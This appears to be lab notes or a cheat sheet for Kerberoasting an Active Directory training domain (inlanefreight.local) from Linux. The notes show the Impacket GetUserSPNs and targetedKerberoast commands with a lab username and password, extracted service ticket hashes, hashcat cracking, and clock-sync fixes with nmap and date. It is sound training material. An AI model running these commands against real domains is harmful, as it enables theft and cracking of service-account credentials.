# Kerberoasting from Linux

## Hosts File

```sh
my@attack:~$ echo "10.129.205.35 inlanefreight.local" | sudo tee -a /etc/hosts
```

## Enumeration

```sh
my@attack:~$ GetUserSPNs.py 'INLANEFREIGHT.LOCAL'/'carole.rose':'jasmine'
```

```output title="Output" hl_lines="9"
ServicePrincipalName                     Name           MemberOf  PasswordLastSet             LastLogon                   Delegation
---------------------------------------  -------------  --------  --------------------------  --------------------------  -------------
CIFS/fake.inlanefreight.local            callum.dixon             2022-10-14 14:59:52.112360  <never>                     unconstrained
HTTP/DC01                                beth.richards            2022-10-14 14:59:54.502995  2023-04-01 19:05:55.494221  constrained
MSSQL_svc_dev/inlanefreight.local:1433   sqldev                   2022-10-14 15:00:06.487374  <never>
MSSQLSvc/SQL01:1433                      sqlprod                  2022-10-14 15:00:09.815510  <never>
MSSQL_svc_qa/inlanefreight.local:1433    sqlqa                    2022-10-14 15:00:12.846748  <never>
MSSQL_svc_test/inlanefreight.local:1433  sql-test                 2022-10-14 15:00:16.409248  <never>
IIS_dev/inlanefreight.local:80           adam.jones               2023-03-30 17:49:38.760866  <never>
SVC/FILER02.inlanefreight.local          jacob.kelly              2022-10-14 15:00:23.127990  <never>
```

## Performing the Attack

```sh
my@attack:~$ GetUserSPNs.py 'INLANEFREIGHT.LOCAL'/'carole.rose':'jasmine' -request
```

```output title="Output" hl_lines="15-22"
ServicePrincipalName                     Name           MemberOf  PasswordLastSet             LastLogon                   Delegation
---------------------------------------  -------------  --------  --------------------------  --------------------------  -------------
CIFS/fake.inlanefreight.local            callum.dixon             2022-10-14 14:59:52.112360  <never>                     unconstrained
HTTP/DC01                                beth.richards            2022-10-14 14:59:54.502995  2023-04-01 19:05:55.494221  constrained
MSSQL_svc_dev/inlanefreight.local:1433   sqldev                   2022-10-14 15:00:06.487374  <never>
MSSQLSvc/SQL01:1433                      sqlprod                  2022-10-14 15:00:09.815510  <never>
MSSQL_svc_qa/inlanefreight.local:1433    sqlqa                    2022-10-14 15:00:12.846748  <never>
MSSQL_svc_test/inlanefreight.local:1433  sql-test                 2022-10-14 15:00:16.409248  <never>
IIS_dev/inlanefreight.local:80           adam.jones               2023-03-30 17:49:38.760866  <never>
SVC/FILER02.inlanefreight.local          jacob.kelly              2022-10-14 15:00:23.127990  <never>



[-] CCache file is not found. Skipping...
$krb5tgs$23$*callum.dixon$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/callum.dixon*$732aeaf99fa4deee65e617ee313e1fd2$
$krb5tgs$23$*beth.richards$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/beth.richards*$defefed37c171f372a93f47c8787804b$
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$c9ea0ddd27a58d355a0549dfdeae139a$
$krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqlprod*$563118fe6f9351a7e0f3361072655df1$
$krb5tgs$23$*sqlqa$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqlqa*$2c8b7379f0c5da3ee7fa6b8e330178ac$
$krb5tgs$23$*sql-test$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sql-test*$5e8afcea3022137b925585d77f1cbed4$
$krb5tgs$23$*adam.jones$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/adam.jones*$e50e6d7a6f65fab76b5cd1de77442de5$
$krb5tgs$23$*jacob.kelly$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/jacob.kelly*$bffedfbdb56ab4170de44b4ba5d204c7$
```

## Performing the Attack (Adam Jones)

```sh
my@attack:~$ GetUserSPNs.py 'INLANEFREIGHT.LOCAL'/'carole.rose':'jasmine' -request-user adam.jones -outputfile adam.jones.hash
```

```output title="Output" hl_lines="15-22"
ServicePrincipalName                     Name           MemberOf  PasswordLastSet             LastLogon                   Delegation
---------------------------------------  -------------  --------  --------------------------  --------------------------  -------------
IIS_dev/inlanefreight.local:80           adam.jones               2023-03-30 17:49:38.760866  <never>
```

## Cracking the Hash

```sh
my@attack:~$ hashcat --hwmon-disable -a 0 -m 13100 adam.jones.hash /usr/local/share/wordlists/rockyou.txt
```

## [Targeted Kerberoasting](https://github.com/ShutdownRepo/targetedKerberoast)

```sh
my@attack:~$ targetedKerberoast.py -d 'INLANEFREIGHT.LOCAL' -u 'carole.rose' -p 'jasmine' --request-user adam.jones -v
```

## Kerberos Session Clock Problem

### Disabling NTP

```sh
my@attack:~$ sudo timedatectl set-ntp false
```

### Automated Method

```sh
my@attack:~$ sudo htpdate -4 -s 10.129.205.35
```

### Manual Method

#### Getting the Server Time

```sh
my@attack:~$ sudo nmap 10.129.205.35 -p 88 -sV
```

```output title="Output" hl_lines="6"
Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-17 15:53 +0300
Nmap scan report for inlanefreight.local (10.129.205.35)
Host is up (0.24s latency).

PORT   STATE SERVICE      VERSION
88/tcp open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-06-17 12:54:02Z)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.55 seconds
```

#### Getting the Server Time (NSE)

```sh
my@attack:~$ sudo nmap 10.129.205.35 -p 123 -sU --script ntp-info
```

```output title="Output" hl_lines="8"
Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-17 15:53 +0300
Nmap scan report for inlanefreight.local (10.129.205.35)
Host is up (0.15s latency).

PORT    STATE SERVICE
123/udp open  ntp
| ntp-info:
|_  receive time stamp: 2025-06-17T12:54:02

Nmap done: 1 IP address (1 host up) scanned in 7.55 seconds
```

#### Setting the Date

```sh
my@attack:~$ sudo date -s "2025-06-17 12:54:02 UTC"
```

```output title="Output"
Tue Jun 17 03:54:02 PM +03 2025
```
